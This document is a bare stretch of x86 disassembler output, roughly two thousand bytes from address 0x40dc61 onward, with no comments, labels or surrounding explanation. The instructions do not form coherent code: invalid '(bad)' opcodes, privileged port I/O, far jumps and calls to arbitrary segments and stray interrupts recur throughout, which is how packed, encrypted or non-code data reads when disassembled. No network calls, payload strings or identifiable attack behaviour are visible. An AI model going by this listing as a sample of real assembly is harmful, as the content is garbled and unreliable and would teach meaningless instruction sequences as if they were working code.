  40dc61:	imul   edi,DWORD PTR [esi+0x7eccfd26],0x79
  40dc68:	add    esi,DWORD PTR [eax]
  40dc6a:	lods   al,BYTE PTR ds:[esi]
  40dc6b:	(bad)
  40dc70:	pop    edi
  40dc71:	sub    DWORD PTR [ebp-0x3d92eb0e],edi
  40dc77:	das    
  40dc78:	adc    bh,BYTE PTR [edx-0x446ae18d]
  40dc7e:	push   cs
  40dc7f:	sub    cl,al
  40dc81:	cmp    dl,BYTE PTR ds:0xa94b5d33
  40dc87:	jnp    0x40dc5f
  40dc89:	xor    cl,BYTE PTR [eax+0x146cf5b3]
  40dc8f:	push   ss
  40dc90:	or     edi,ebp
  40dc92:	sbb    esi,DWORD PTR [ecx+0x4a]
  40dc95:	and    eax,0x5aeb5963
  40dc9a:	(bad)  
  40dc9b:	stc    
  40dc9c:	push   ss
  40dc9d:	or     eax,0x830a3a3f
  40dca2:	lods   al,BYTE PTR ds:[esi]
  40dca3:	pop    eax
  40dca4:	sub    BYTE PTR [esi],al
  40dca6:	inc    ebx
  40dca7:	into   
  40dca8:	mov    ch,0x91
  40dcaa:	jecxz  0x40dc69
  40dcac:	push   ebp
  40dcad:	mov    DWORD PTR [ecx],ebx
  40dcaf:	push   0xffffff95
  40dcb1:	jg     0x40dc91
  40dcb3:	xchg   ebx,eax
  40dcb4:	add    DWORD PTR [esi-0x5e],0x86692703
  40dcbb:	les    edi,FWORD PTR cs:[ebx+0x6a]
  40dcbf:	mov    bh,0x15
  40dcc1:	jbe    0x40dc8b
  40dcc3:	adc    ebp,DWORD PTR [ecx]
  40dcc5:	test   al,0xf0
  40dcc7:	(bad)  
  40dcc8:	std    
  40dcc9:	inc    edi
  40dcca:	dec    edi
  40dccb:	sbb    al,0x5d
  40dccd:	jae    0x40dcf1
  40dccf:	add    ch,cl
  40dcd1:	frstor [esi-0x3d00442d]
  40dcd7:	inc    esi
  40dcd8:	lahf   
  40dcd9:	cmp    BYTE PTR [eax+0x36],bl
  40dcdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dcdd:	std    
  40dcde:	xlat   BYTE PTR ds:[ebx]
  40dcdf:	jl     0x40dd54
  40dce1:	sub    al,dl
  40dce3:	test   eax,0xfddc6609
  40dce8:	fwait
  40dce9:	retf   0x4cfc
  40dcec:	xchg   ebx,eax
  40dced:	(bad)  
  40dcee:	in     eax,dx
  40dcef:	iret   
  40dcf0:	into   
  40dcf1:	dec    esp
  40dcf2:	add    eax,0x2c36917c
  40dcf7:	fs nop
  40dcf9:	jge    0x40dd09
  40dcfb:	xlat   BYTE PTR ds:[ebx]
  40dcfc:	mov    eax,ds:0x7fb726fd
  40dd01:	inc    ebx
  40dd02:	ja     0x40dcc6
  40dd04:	cmp    eax,DWORD PTR [ecx-0x17ce86f7]
  40dd0a:	gs popf 
  40dd0c:	into   
  40dd0d:	pop    edi
  40dd0e:	or     eax,ebp
  40dd10:	push   edi
  40dd11:	sub    DWORD PTR [eax+0x47f95218],0x36
  40dd18:	icebp  
  40dd19:	xchg   edx,eax
  40dd1a:	jge    0x40dcd8
  40dd1c:	ds lock loopne 0x40dd29
  40dd20:	outs   dx,DWORD PTR ds:[esi]
  40dd21:	sar    BYTE PTR ds:0xb8966068,0x54
  40dd28:	(bad)  
  40dd29:	stc    
  40dd2a:	jmp    0x9fae:0x20575c9e
  40dd31:	mov    eax,0x66fe3203
  40dd36:	add    DWORD PTR [edi+esi*4+0x774df238],0xffffffb2
  40dd3e:	inc    eax
  40dd3f:	or     eax,0x74107482
  40dd44:	(bad)  
  40dd45:	popa   
  40dd46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd47:	sar    BYTE PTR [ebp+edx*2+0x3c17c696],1
  40dd4e:	mov    esi,0x4165a831
  40dd53:	mov    BYTE PTR [ecx],ch
  40dd55:	int    0x23
  40dd57:	push   ecx
  40dd58:	inc    edi
  40dd59:	out    0xbe,al
  40dd5b:	and    esi,edi
  40dd5d:	test   DWORD PTR [edi],0xf15aed01
  40dd63:	adc    DWORD PTR [eax],ecx
  40dd65:	out    0x56,eax
  40dd67:	dec    BYTE PTR [ecx+0x2]
  40dd6a:	mov    ah,0x33
  40dd6c:	ds nop
  40dd6e:	mov    esp,0x9694c71d
  40dd73:	push   es
  40dd74:	jb     0x40dd73
  40dd76:	out    0x9a,eax
  40dd78:	dec    ecx
  40dd79:	and    eax,0x6ad60c05
  40dd7e:	push   ss
  40dd7f:	repz sbb dh,ch
  40dd82:	ret    
  40dd83:	test   al,0x88
  40dd85:	daa    
  40dd86:	popf   
  40dd87:	xor    al,0x43
  40dd89:	scas   eax,DWORD PTR es:[edi]
  40dd8a:	pusha  
  40dd8b:	or     eax,0xc09f99be
  40dd90:	add    BYTE PTR [ebx-0x76410e29],dh
  40dd96:	ror    edi,0xb0
  40dd99:	add    al,BYTE PTR [eax]
  40dd9b:	ins    DWORD PTR es:[edi],dx
  40dd9c:	sbb    eax,0xed97f0d6
  40dda1:	fs jne 0x40de08
  40dda4:	jg     0x40de15
  40dda6:	and    ah,BYTE PTR [esi]
  40dda8:	inc    edi
  40dda9:	xor    al,0xbb
  40ddab:	push   es
  40ddac:	inc    ebx
  40ddad:	aam    0x1a
  40ddaf:	sbb    BYTE PTR [edx],0x16
  40ddb2:	fadd   DWORD PTR [eax-0x78cfd8fe]
  40ddb8:	adc    DWORD PTR [esi],0xaf73d5b5
  40ddbe:	iret   
  40ddbf:	ins    DWORD PTR es:[edi],dx
  40ddc0:	mov    eax,ds:0x2173e110
  40ddc5:	fimul  WORD PTR [eax]
  40ddc7:	adc    bh,ch
  40ddc9:	add    bl,BYTE PTR ds:0x6275087
  40ddcf:	repnz ins BYTE PTR es:[edi],dx
  40ddd1:	test   BYTE PTR [ebx],bh
  40ddd3:	pusha  
  40ddd4:	mov    ebp,0x1843fe5b
  40ddd9:	lea    edx,[ebp+0x2a5b1f3b]
  40dddf:	and    DWORD PTR [ebx-0x43742a5a],0x7cd4855e
  40dde9:	dec    edi
  40ddea:	mov    ah,0xcb
  40ddec:	retf   
  40dded:	arpl   WORD PTR [edx+esi*4-0x2ff55cac],sp
  40ddf4:	lds    edx,FWORD PTR [edx-0x77]
  40ddf7:	int    0x58
  40ddf9:	jg     0x40ddf9
  40ddfb:	loope  0x40de64
  40ddfd:	pop    ebx
  40ddfe:	aaa    
  40ddff:	div    bl
  40de01:	bound  esp,QWORD PTR [edi-0x5056c51b]
  40de07:	ret    0x2612
  40de0a:	int3   
  40de0b:	add    esi,0x74aa57af
  40de11:	xor    eax,0x328cc7bd
  40de16:	dec    ebx
  40de17:	lds    esp,FWORD PTR [edx-0xd]
  40de1a:	inc    ebp
  40de1b:	inc    eax
  40de1c:	inc    ecx
  40de1d:	out    0xe3,eax
  40de1f:	rcr    BYTE PTR [edx+0x49],0x82
  40de23:	sbb    eax,0x809d3d14
  40de28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de29:	sbb    edi,DWORD PTR [ecx-0x73]
  40de2c:	pop    ebp
  40de2d:	cwde   
  40de2e:	xor    eax,0x563b81a1
  40de33:	adc    DWORD PTR [ecx+0x67],ecx
  40de36:	sbb    dl,ch
  40de38:	ds push ecx
  40de3a:	out    0x59,al
  40de3c:	jg     0x40de54
  40de3e:	cli    
  40de3f:	xchg   ebp,eax
  40de40:	or     BYTE PTR [ecx+0x18],bl
  40de43:	(bad)  
  40de44:	mov    edx,0xeef039e7
  40de49:	adc    BYTE PTR [edx-0x7cf75a8],dh
  40de4f:	es jmp 0x8a87:0xd985871e
  40de57:	aad    0xd0
  40de59:	or     al,0xe1
  40de5b:	repz out 0xbf,al
  40de5e:	int3   
  40de5f:	ret    
  40de60:	and    BYTE PTR [esi-0x15d1b2f4],al
  40de66:	fisttp QWORD PTR [esi-0x7b]
  40de69:	ds jno 0x40de51
  40de6c:	fiadd  WORD PTR [di-0x71]
  40de70:	dec    esp
  40de71:	call   0x9d73d202
  40de76:	dec    esp
  40de77:	or     edx,DWORD PTR [ebx-0x6c9fa383]
  40de7d:	imul   eax,DWORD PTR [ebx],0x65
  40de80:	shl    DWORD PTR [esi+0x5e74e177],cl
  40de86:	scas   al,BYTE PTR es:[edi]
  40de87:	mov    ebx,0xa1c6e73c
  40de8c:	test   eax,0x25a15801
  40de91:	stos   DWORD PTR es:[edi],eax
  40de92:	es sbb cl,dh
  40de95:	or     DWORD PTR [ebx+ebp*2-0xb2a476c],ecx
  40de9c:	cwde   
  40de9d:	push   0x81382a29
  40dea2:	and    al,0x60
  40dea4:	pop    es
  40dea5:	mov    WORD PTR ds:0x9d1aa430,fs
  40deab:	mov    edi,0x64761f90
  40deb0:	test   al,0xb1
  40deb2:	(bad)  [ebp-0x5a72f2e0]
  40deb8:	pop    esp
  40deb9:	clc    
  40deba:	or     BYTE PTR cs:[ecx-0x4bba57c9],ch
  40dec1:	mov    ebx,ebx
  40dec3:	fcmovb st,st(6)
  40dec5:	lock test ch,bl
  40dec8:	enter  0x3770,0x19
  40decc:	fldenv [ebp-0x409eab1c]
  40ded2:	je     0x40df24
  40ded4:	pusha  
  40ded5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ded6:	das    
  40ded7:	and    dl,ah
  40ded9:	(bad)  
  40deda:	push   0x6d44c6e3
  40dedf:	ja     0x40de94
  40dee1:	fimul  DWORD PTR [esi]
  40dee3:	mov    dh,0xe8
  40dee5:	je     0x40deb7
  40dee7:	fsub   st(1),st
  40dee9:	pop    edx
  40deea:	stc    
  40deeb:	jl     0x40de6f
  40deed:	push   0x71dd851
  40def2:	adc    edi,DWORD PTR [edi+0x3a6fc9d2]
  40def8:	or     ecx,0xbbf8e402
  40defe:	pop    esp
  40deff:	adc    eax,edi
  40df01:	push   ebp
  40df02:	icebp  
  40df03:	xlat   BYTE PTR ds:[ebx]
  40df04:	cmc    
  40df05:	and    BYTE PTR [edi-0x17],al
  40df08:	lods   eax,DWORD PTR ds:[esi]
  40df09:	mov    cl,0x49
  40df0b:	in     eax,dx
  40df0c:	adc    al,BYTE PTR [ebp+0x34986758]
  40df12:	retf   
  40df13:	mov    bl,0xca
  40df15:	mov    al,0x43
  40df17:	test   eax,0xb5f98c28
  40df1c:	sbb    DWORD PTR [esi+0x57d057ed],ebx
  40df22:	dec    ebx
  40df23:	int3   
  40df24:	int    0x7
  40df26:	jmp    0x40df2d
  40df28:	mov    esi,0x89b3ba3f
  40df2d:	push   0xc19ed8b4
  40df32:	arpl   cx,di
  40df34:	fcom   DWORD PTR [edi]
  40df36:	mov    ds:0x2c28290c,al
  40df3b:	(bad)  
  40df3c:	adc    al,0x5f
  40df3e:	mov    ebx,0x3689d0ee
  40df43:	in     eax,0x34
  40df45:	ret    
  40df46:	cld    
  40df47:	adc    al,0x8e
  40df49:	pop    ss
  40df4a:	pop    ds
  40df4b:	fdiv   DWORD PTR [ebp+0x35]
  40df4e:	loopne 0x40df17
  40df50:	cwde   
  40df51:	ins    DWORD PTR es:[edi],dx
  40df52:	repz mov ecx,0x7e4eb9d
  40df58:	cmp    esi,ebx
  40df5a:	cmp    al,0xdf
  40df5c:	rcl    BYTE PTR [edi+0x25],1
  40df5f:	push   ss
  40df60:	xchg   esp,eax
  40df61:	pop    ss
  40df62:	cmp    eax,0x9a656d2a
  40df67:	jg     0x40deff
  40df69:	jae    0x40dfbb
  40df6b:	cli    
  40df6c:	retf   
  40df6d:	adc    ch,0x3e
  40df70:	arpl   WORD PTR [edx-0x66],di
  40df73:	and    ah,BYTE PTR [edi]
  40df75:	adc    eax,0x41262e14
  40df7a:	pop    edx
  40df7b:	test   BYTE PTR [eax+0x24322752],0xdd
  40df82:	dec    ebp
  40df83:	loopne 0x40dfdd
  40df85:	add    dh,ch
  40df87:	dec    eax
  40df88:	push   edi
  40df89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df8a:	inc    ebp
  40df8b:	ss ja  0x40df34
  40df8e:	imul   BYTE PTR [ecx+0x59c31a43]
  40df94:	arpl   WORD PTR [esp+ecx*4],dx
  40df97:	xor    eax,0xc4ee226c
  40df9c:	xor    eax,DWORD PTR [ebx+0x39]
  40df9f:	lods   al,BYTE PTR ds:[esi]
  40dfa0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dfa1:	pop    ebx
  40dfa2:	(bad)  
  40dfa3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dfa4:	push   ebp
  40dfa5:	icebp  
  40dfa6:	cdq    
  40dfa7:	add    al,0xd8
  40dfa9:	js     0x40df8b
  40dfab:	adc    cl,0xf8
  40dfae:	ja     0x40dfb0
  40dfb0:	and    eax,0x8f6629db
  40dfb5:	iret   
  40dfb6:	or     ch,0xda
  40dfb9:	cli    
  40dfba:	cld    
  40dfbb:	std    
  40dfbc:	add    edi,DWORD PTR [edi-0xe04ade7]
  40dfc2:	(bad)  
  40dfc4:	test   BYTE PTR [ebp-0x6e],0xf6
  40dfc8:	int    0xe9
  40dfca:	pop    edi
  40dfcb:	imul   edx,DWORD PTR [eax],0xffffff91
  40dfce:	push   ecx
  40dfd0:	js     0x40e00e
  40dfd2:	and    edi,DWORD PTR [ebp+ebp*8-0x5b]
  40dfd6:	jae    0x40e012
  40dfd8:	add    edi,DWORD PTR [ecx-0x21]
  40dfdb:	out    0x2,al
  40dfdd:	ret    
  40dfde:	aas    
  40dfdf:	adc    eax,0xc5e58726
  40dfe4:	xchg   edx,eax
  40dfe5:	push   cs
  40dfe6:	mov    BYTE PTR [esi],ch
  40dfe8:	jb     0x40dfe5
  40dfea:	jmp    0xee1b:0xc203d68d
  40dff1:	xor    DWORD PTR [ecx-0x42],ebx
  40dff4:	xchg   edx,esi
  40dff6:	retf   
  40dff7:	das    
  40dff8:	mov    al,0xf9
  40dffa:	in     eax,dx
  40dffb:	sub    al,BYTE PTR [ecx-0x695fa842]
  40e001:	pop    edi
  40e002:	(bad)  
  40e003:	or     al,BYTE PTR [eax+0x241aa99e]
  40e009:	mov    dl,0x61
  40e00b:	cld    
  40e00c:	mov    esi,0x96d16b52
  40e011:	call   0x4921:0x5ae70370
  40e018:	pop    esp
  40e019:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e01a:	call   0x2547:0x8393f1bf
  40e021:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e022:	addr16 test bh,0x7a
  40e026:	jecxz  0x40e070
  40e028:	stos   BYTE PTR es:[edi],al
  40e029:	inc    eax
  40e02a:	inc    BYTE PTR [edi-0x39]
  40e02d:	adc    ebp,DWORD PTR [ebx-0x49d0d8ee]
  40e033:	pop    eax
  40e034:	aad    0x32
  40e036:	sbb    al,0x49
  40e038:	sbb    ebx,DWORD PTR [ebp-0x65]
  40e03b:	repnz mov ah,0xb5
  40e03e:	jmp    0x40e0be
  40e040:	push   eax
  40e041:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e042:	adc    BYTE PTR [edx],0xcf
  40e045:	gs dec ebp
  40e047:	ret    
  40e048:	aad    0x9
  40e04a:	pop    esp
  40e04b:	xchg   esi,eax
  40e04c:	sbb    DWORD PTR [esi-0x36],edx
  40e04f:	lahf   
  40e050:	inc    ecx
  40e051:	mov    ch,0xee
  40e053:	mov    esi,0xc6e5dee6
  40e058:	out    dx,al
  40e059:	mov    esp,0x99b3a8cd
  40e05e:	mov    ds:0x9257127b,al
  40e063:	ins    BYTE PTR es:[edi],dx
  40e064:	out    0x39,al
  40e066:	je     0x40e07c
  40e068:	dec    ecx
  40e069:	fwait
  40e06a:	dec    edi
  40e06b:	nop
  40e06c:	inc    edi
  40e06d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e06e:	repnz xchg edx,eax
  40e070:	pop    es
  40e071:	sbb    eax,0xd53f98a6
  40e076:	cld    
  40e077:	add    eax,0x305331c0
  40e07c:	xchg   ax,ax
  40e07e:	inc    esp
  40e07f:	jb     0x40e06e
  40e081:	test   al,0x31
  40e083:	mov    eax,ds:0x63506978
  40e088:	(bad)  
  40e089:	rol    ebx,cl
  40e08b:	sbb    BYTE PTR [esi-0x5bbf5a38],0x1d
  40e092:	add    al,0x81
  40e094:	sti    
  40e095:	mov    edi,0x925b54c0
  40e09a:	xor    dl,cl
  40e09c:	aad    0x78
  40e09e:	ss (bad) 
  40e0a0:	pop    edx
  40e0a1:	or     edi,edx
  40e0a3:	inc    eax
  40e0a4:	stos   BYTE PTR es:[edi],al
  40e0a5:	fdiv   DWORD PTR [eax+0x49]
  40e0a8:	add    edi,DWORD PTR [edi+ebp*2+0x2cc73ac4]
  40e0af:	xor    eax,0x66db4870
  40e0b4:	fisub  WORD PTR [edi]
  40e0b6:	fst    QWORD PTR [edx+0x509e00f1]
  40e0bc:	or     BYTE PTR [ecx+0x5cd818f4],0x93
  40e0c3:	or     cl,dl
  40e0c5:	push   esi
  40e0c6:	push   ecx
  40e0c7:	bound  esi,QWORD PTR [esi+0x5b40a959]
  40e0cd:	push   edx
  40e0ce:	daa    
  40e0cf:	xchg   ebx,eax
  40e0d0:	in     eax,dx
  40e0d1:	jl     0x40e0af
  40e0d3:	mov    edi,0xf130f61e
  40e0d8:	fimul  WORD PTR [edx+0xa]
  40e0db:	(bad)  
  40e0dc:	ja     0x40e065
  40e0de:	icebp  
  40e0df:	sbb    DWORD PTR [edx-0x36],esp
  40e0e2:	jnp    0x40e0aa
  40e0e4:	add    eax,0x321cfe00
  40e0e9:	cld    
  40e0ea:	jle    0x40e0e8
  40e0ec:	int3   
  40e0ed:	out    0x4e,eax
  40e0ef:	adc    edi,DWORD PTR [edx+0x42]
  40e0f2:	xchg   DWORD PTR [edi-0x5b],edi
  40e0f5:	clc    
  40e0f6:	rol    BYTE PTR [eax],1
  40e0f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0f9:	cmp    al,0x31
  40e0fb:	mov    ch,BYTE PTR [eax+0x6c5b7cfd]
  40e101:	sbb    eax,0x86aaca80
  40e106:	xchg   ebp,eax
  40e107:	fwait
  40e108:	add    eax,0xe4cdd1ea
  40e10d:	frstor [ebx]
  40e10f:	xlat   BYTE PTR ds:[ebx]
  40e110:	push   ebx
  40e111:	fwait
  40e112:	cmp    esp,ebx
  40e114:	ror    BYTE PTR [edi+0x7480ed12],1
  40e11a:	retf   
  40e11b:	dec    ecx
  40e11c:	inc    esi
  40e11d:	sub    al,cl
  40e11f:	push   esi
  40e120:	shl    bh,1
  40e122:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e123:	call   0x24eb35b4
  40e128:	and    dl,dl
  40e12a:	lea    ecx,[ecx]
  40e12c:	adc    BYTE PTR [esi+ecx*4-0x19808b87],bl
  40e133:	dec    esp
  40e134:	push   0x81c3b0a4
  40e139:	mov    bl,BYTE PTR [edi-0x26]
  40e13c:	jmp    0x40e19c
  40e13e:	in     eax,0xcd
  40e140:	dec    ebx
  40e141:	adc    BYTE PTR [ecx-0x8836106],dl
  40e147:	enter  0x668a,0xc7
  40e14b:	rcl    DWORD PTR ds:0xf6806bca,1
  40e151:	sub    eax,0xbc372d74
  40e156:	jno    0x40e0e9
  40e158:	adc    eax,0xfbe96fb8
  40e15d:	inc    ecx
  40e15e:	push   esi
  40e15f:	retf   0x6495
  40e162:	mov    esi,0xe65fef7e
  40e167:	es or  eax,0x6f34b8f0
  40e16d:	dec    edx
  40e16e:	lods   al,BYTE PTR ds:[esi]
  40e16f:	or     DWORD PTR [ecx+0x34],esp
  40e172:	cmp    BYTE PTR [ebx+0x14],0xe0
  40e176:	aaa    
  40e177:	shl    ebp,cl
  40e179:	and    BYTE PTR [ebx-0x5f],0x6
  40e17d:	pop    esp
  40e17e:	cmp    BYTE PTR [ecx+0x2711b7a5],dh
  40e184:	push   ss
  40e185:	(bad)  [ebp+0x3bafe318]
  40e18b:	in     eax,0x64
  40e18d:	gs mov edx,0xae116712
  40e193:	fdivr  DWORD PTR [edx+0x26]
  40e196:	push   ss
  40e197:	in     al,0x8e
  40e199:	mov    edx,0xbf4a4670
  40e19e:	mov    esp,0x94f58455
  40e1a3:	mov    esi,0x9f349349
  40e1a8:	int3   
  40e1a9:	mov    ebp,eax
  40e1ab:	sbb    bl,BYTE PTR fs:[edx]
  40e1ae:	add    edi,ebx
  40e1b0:	shl    DWORD PTR [edi*4+0x29ed3e35],0x98
  40e1b8:	je     0x40e181
  40e1ba:	cs jb  0x40e15c
  40e1bd:	xor    eax,0xf8e0e9cd
  40e1c2:	mov    bh,ah
  40e1c4:	xchg   edx,eax
  40e1c5:	add    dh,BYTE PTR [ecx]
  40e1c7:	pop    ss
  40e1c8:	icebp  
  40e1c9:	add    BYTE PTR [edi+0x4f238f55],ah
  40e1cf:	mov    cl,0x7
  40e1d1:	js     0x40e1b7
  40e1d3:	adc    ebx,ebx
  40e1d5:	or     eax,0x186d818d
  40e1da:	mov    cl,0xa7
  40e1dc:	fsub   st(5),st
  40e1de:	and    ch,dl
  40e1e0:	call   0x6d9852b8
  40e1e5:	ins    DWORD PTR es:[edi],dx
  40e1e6:	jnp    0x40e21f
  40e1e8:	xlat   BYTE PTR ds:[ebx]
  40e1e9:	test   DWORD PTR [edx],0x27c06c06
  40e1ef:	fisubr DWORD PTR [eax+0x24]
  40e1f2:	sub    BYTE PTR [ecx],al
  40e1f4:	inc    edx
  40e1f5:	dec    edi
  40e1f6:	adc    esi,DWORD PTR [esi]
  40e1f8:	and    bh,0x7c
  40e1fb:	pop    ss
  40e1fc:	or     edi,edi
  40e1fe:	xor    eax,0x73144f16
  40e203:	cmc    
  40e204:	rcr    DWORD PTR [edx],0x1d
  40e207:	pop    ebp
  40e208:	xchg   DWORD PTR [ecx+0x67e44ca7],eax
  40e20e:	and    bh,dh
  40e210:	mov    al,ds:0xf406e272
  40e215:	mov    edi,0x53767684
  40e21a:	fcomp  DWORD PTR [edx-0x57e500f6]
  40e220:	mov    cl,0x3a
  40e222:	fucomp st(4)
  40e224:	and    BYTE PTR [edi-0x6c24bada],al
  40e22a:	adc    cl,BYTE PTR [edi-0x35143994]
  40e230:	sub    DWORD PTR [edx],edx
  40e232:	pop    ecx
  40e233:	loopne 0x40e2ae
  40e235:	mov    bh,0x27
  40e237:	or     BYTE PTR [eax],bh
  40e239:	xor    al,0x18
  40e23b:	int    0x30
  40e23d:	ss (bad) 
  40e23f:	mov    WORD PTR ds:0xad4917ff,?
  40e245:	or     eax,0xbd10e982
  40e24a:	jp     0x40e2b1
  40e24c:	or     DWORD PTR [ecx+0x2a],ebp
  40e24f:	ins    DWORD PTR es:[edi],dx
  40e250:	and    eax,0xdca70a4d
  40e255:	xchg   ebp,eax
  40e256:	jb     0x40e1e7
  40e258:	in     al,dx
  40e259:	adc    esp,DWORD PTR [eax]
  40e25b:	mul    BYTE PTR [esi-0x40]
  40e25e:	out    dx,eax
  40e25f:	ja     0x40e1e5
  40e261:	adc    ecx,DWORD PTR [ebx+0x722f517e]
  40e267:	mov    esp,0x3151fdb0
  40e26c:	int    0x2c
  40e26e:	or     cl,BYTE PTR [esi+0x33e68a66]
  40e274:	mov    BYTE PTR [eax+0xa],0x6
  40e278:	pop    ds
  40e279:	lds    eax,FWORD PTR [ecx-0x1cba0cc8]
  40e27f:	sbb    edx,DWORD PTR [eax]
  40e281:	retf   0xdd6c
  40e284:	mov    ah,0x9
  40e286:	mov    esp,0x27c6cb7f
  40e28b:	fs mov al,gs:0x58516fd
  40e292:	inc    ecx
  40e293:	mov    dh,0xe1
  40e295:	scas   eax,DWORD PTR es:[edi]
  40e296:	adc    eax,DWORD PTR [ebx+0xb]
  40e299:	fwait
  40e29a:	mov    ds:0xd49c103a,al
  40e29f:	retf   
  40e2a0:	add    eax,DWORD PTR [edx+0x1f]
  40e2a3:	aas    
  40e2a4:	mov    bl,0x79
  40e2a6:	pushf  
  40e2a7:	push   0xffffffc9
  40e2a9:	fimul  WORD PTR [edx-0x6c8e9f40]
  40e2af:	sub    eax,0x63650bf4
  40e2b4:	xchg   edi,eax
  40e2b5:	mov    DWORD PTR [ebp-0x80],ebp
  40e2b8:	push   esi
  40e2b9:	sbb    BYTE PTR [eax],bh
  40e2bb:	adc    DWORD PTR [edi+0x579c4e32],esi
  40e2c1:	sbb    bl,BYTE PTR [esp+edx*8]
  40e2c4:	xlat   BYTE PTR ds:[ebx]
  40e2c5:	fstp   QWORD PTR [ebx]
  40e2c7:	stos   BYTE PTR es:[edi],al
  40e2c8:	fstp   DWORD PTR [esi-0x22ac40ab]
  40e2ce:	adc    DWORD PTR [ebp+0xa],ebp
  40e2d1:	pushf  
  40e2d2:	add    BYTE PTR [edi],0x95
  40e2d5:	aad    0xa3
  40e2d7:	or     al,ah
  40e2d9:	dec    edx
  40e2da:	or     BYTE PTR [edx],0xa0
  40e2dd:	hlt    
  40e2de:	(bad)  
  40e2df:	sub    ebx,DWORD PTR [edx+0x51]
  40e2e2:	mov    dl,0xdd
  40e2e4:	or     al,0x6f
  40e2e6:	sbb    dh,BYTE PTR [edx-0x75da53ed]
  40e2ec:	rol    esi,1
  40e2ee:	call   0xa25ee807
  40e2f3:	scas   al,BYTE PTR es:[edi]
  40e2f4:	(bad)  
  40e2f5:	fwait
  40e2f6:	pop    edi
  40e2f7:	ja     0x40e361
  40e2f9:	mov    bl,ah
  40e2fb:	pop    ds
  40e2fc:	and    bl,BYTE PTR [esi]
  40e2fe:	add    eax,0x6ce5392f
  40e303:	jecxz  0x40e302
  40e305:	bound  ebx,QWORD PTR [eax-0x64]
  40e308:	ds inc ebp
  40e30a:	leave  
  40e30b:	test   BYTE PTR [eax+0x201e284e],0x0
  40e312:	sahf   
  40e313:	jge    0x40e310
  40e315:	mov    ah,0x2f
  40e317:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e318:	int3   
  40e319:	inc    eax
  40e31a:	shl    DWORD PTR ds:0x86c421b5,1
  40e320:	jb     0x40e2b2
  40e322:	sar    ebx,1
  40e324:	std    
  40e325:	fmulp  st(2),st
  40e327:	sbb    ebp,DWORD PTR [ecx+ebx*2+0x6fb02cba]
  40e32e:	mov    ds:0x222d5b7c,eax
  40e333:	inc    ebx
  40e334:	bound  ecx,QWORD PTR [edx-0x34]
  40e337:	dec    ecx
  40e338:	adc    ch,BYTE PTR [eax]
  40e33a:	inc    edx
  40e33b:	pop    esp
  40e33c:	and    bh,BYTE PTR [ecx-0x15]
  40e33f:	xor    edx,ebp
  40e341:	inc    edi
  40e342:	mov    ch,0xc1
  40e344:	mov    edx,0x5d1b5d2c
  40e349:	adc    esp,edx
  40e34b:	mov    ?,WORD PTR [edx-0x16c29a3f]
  40e351:	jnp    0x40e2fc
  40e353:	call   0xa8b7:0x89f82ff
  40e35a:	pop    esp
  40e35b:	dec    ebp
  40e35c:	xor    BYTE PTR [edx-0x3d],0xd4
  40e360:	add    al,0x6d
  40e362:	shl    DWORD PTR [ebx-0x56e8576a],1
  40e368:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e369:	cmp    eax,ecx
  40e36b:	sbb    ah,BYTE PTR [ebp-0x323693fd]
  40e371:	(bad)  
  40e372:	mov    al,0x71
  40e374:	pop    ds
  40e375:	mov    dh,0x31
  40e377:	xor    BYTE PTR [esp+ebx*4+0x6d],al
  40e37b:	dec    DWORD PTR [ebx-0x2bd68057]
  40e381:	mov    ?,WORD PTR [ebp-0x2]
  40e384:	mov    cl,0x8d
  40e386:	adc    DWORD PTR [ebp-0x202566b4],ecx
  40e38c:	das    
  40e38d:	adc    eax,0x35dde8f3
  40e392:	pop    edi
  40e393:	sahf   
  40e394:	jo     0x40e372
  40e396:	pushf  
  40e397:	enter  0xca06,0x58
  40e39b:	test   bh,0xc2
  40e39e:	mov    al,0xac
  40e3a0:	sti    
  40e3a1:	xchg   ebp,esp
  40e3a3:	lahf   
  40e3a4:	jno    0x40e3df
  40e3a6:	cmp    BYTE PTR [ecx],ah
  40e3a8:	imul   ecx,DWORD PTR [ecx],0xd3474b5c
  40e3ae:	xchg   DWORD PTR [edi-0x63d087f],edx
  40e3b4:	xchg   edi,eax
  40e3b5:	or     BYTE PTR [bx+0x2381],ah
  40e3ba:	sbb    BYTE PTR [edx+0x34],dh
  40e3bd:	jne    0x40e3ca
  40e3bf:	repnz hlt 
  40e3c1:	pushf  
  40e3c2:	adc    DWORD PTR [ebx+0x43],esp
  40e3c5:	pop    ebp
  40e3c6:	je     0x40e3c6
  40e3c8:	inc    esp
  40e3c9:	fisubr WORD PTR [edx-0x6e08c812]
  40e3cf:	and    DWORD PTR [edi],0x2916b082
  40e3d5:	sbb    ebx,ebx
  40e3d7:	neg    BYTE PTR [esi-0x6e]
  40e3da:	call   0xa806481e
  40e3df:	lahf   
  40e3e0:	js     0x40e3d9
  40e3e2:	inc    esi
  40e3e3:	loop   0x40e375
  40e3e5:	jecxz  0x40e39d
  40e3e7:	jo     0x40e36a
  40e3e9:	xchg   esp,eax
  40e3ea:	scas   eax,DWORD PTR es:[edi]
  40e3eb:	pop    esp
  40e3ec:	mov    ecx,edx
  40e3ee:	ror    DWORD PTR [ecx-0x614547ba],cl
  40e3f4:	pop    ss
  40e3f5:	icebp  
  40e3f6:	pop    eax
  40e3f7:	mov    ecx,0x34e3e2a0
  40e3fc:	mov    dh,ah
  40e3fe:	sub    cl,BYTE PTR [eax-0x34559aa6]
  40e404:	inc    ecx
  40e405:	pop    ss
  40e406:	xchg   esp,eax
  40e407:	sub    bl,BYTE PTR [ebp+0x22]
  40e40a:	or     BYTE PTR [eax],dh
  40e40c:	push   cs
  40e40d:	setae  BYTE PTR [ebx+0x7b]
  40e411:	shl    DWORD PTR [ecx+0x4a4e19a7],1
